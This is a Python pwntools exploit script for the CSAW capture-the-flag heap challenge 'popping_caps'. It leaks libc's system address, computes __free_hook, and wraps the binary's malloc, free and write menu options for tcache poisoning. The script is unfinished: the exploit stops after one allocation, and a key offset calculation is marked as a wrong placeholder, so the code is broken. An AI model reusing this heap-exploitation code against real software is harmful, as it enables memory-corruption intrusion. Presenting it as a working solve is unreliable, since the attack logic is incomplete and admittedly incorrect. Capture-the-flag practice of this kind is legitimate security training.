#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./popping_caps')
libc = ELF('./libc.so.6')
context.log_level = os.environ.get('LOG','info')

HOST, PORT = 'pwn.chal.csaw.io', 8000

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([elf.path])

# robust helpers (remote may vary spacing/newlines)

def menu_choice(io, c):
    io.sendlineafter(b'choice', str(c).encode())

def do_malloc(io, sz):
    menu_choice(io, 1)
    io.sendlineafter(b'many', str(sz).encode())

def do_free(io, off):
    menu_choice(io, 2)
    io.sendlineafter(b'free', str(off).encode())

def do_write(io, data8):
    assert len(data8) == 8
    menu_choice(io, 3)
    io.sendafter(b'in', data8)

def do_bye(io):
    menu_choice(io, 4)


def exploit(io):
    # parse leak: 'Here is system 0x...\n'
    line = io.recvline()
    m = re.search(br'0x[0-9a-fA-F]+', line)
    if not m:
        raise ValueError('no leak in line: %r' % line)
    system_leak = int(m.group(0), 16)
    libc_base = system_leak - libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']
    log.info('system leak: %#x', system_leak)
    log.info('libc base  : %#x', libc_base)
    log.info('__free_hook: %#x', free_hook)

    # 1) create a big base chunk so base is below libc
    do_malloc(io, 0x1000)

    # 2) poison: free __free_hook (as if it were a chunk) so it enters tcache for size 0x20
    off = free_hook - (free_hook & ~0xfff)  # WRONG placeholder

if __name__=='__main__':
    io = start()
    exploit(io)

